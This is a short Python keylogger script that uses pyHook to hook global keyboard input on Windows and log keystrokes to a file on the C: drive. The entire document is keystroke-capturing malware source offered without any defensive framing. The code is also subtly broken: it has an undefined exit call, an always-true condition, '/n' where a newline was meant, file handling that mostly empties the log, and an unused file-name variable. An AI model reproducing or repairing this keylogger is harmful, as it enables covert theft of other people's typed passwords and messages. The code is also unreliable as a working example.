import pyHook, pythoncom, sys, logging
# feel free to set the file_log to a different file name/location

file_log = 'keyloggeroutput.txt'
def OnKeyboardEvent(event): 
    if event.Ascii==5: 
        _exit(1) 
    if event.Ascii !=0 or 8: 
    #open output.txt to read current keystrokes 
        f = open('c:\output.txt', 'r+') 
        buffer = f.read() 
        f.close() 
    # open output.txt to write current + new keystrokes 
        f = open('c:\output.txt', 'w') 
        keylogs = chr(event.Ascii) 
        if event.Ascii == 13: 
            keylogs = '/n'
            buffer += keylogs 
            f.write(buffer) 
        f.close() 
# create a hook manager object 
hm = pyHook.HookManager() 
hm.KeyDown = OnKeyboardEvent 
# set the hook 
hm.HookKeyboard() 
# wait forever 
pythoncom.PumpMessages() 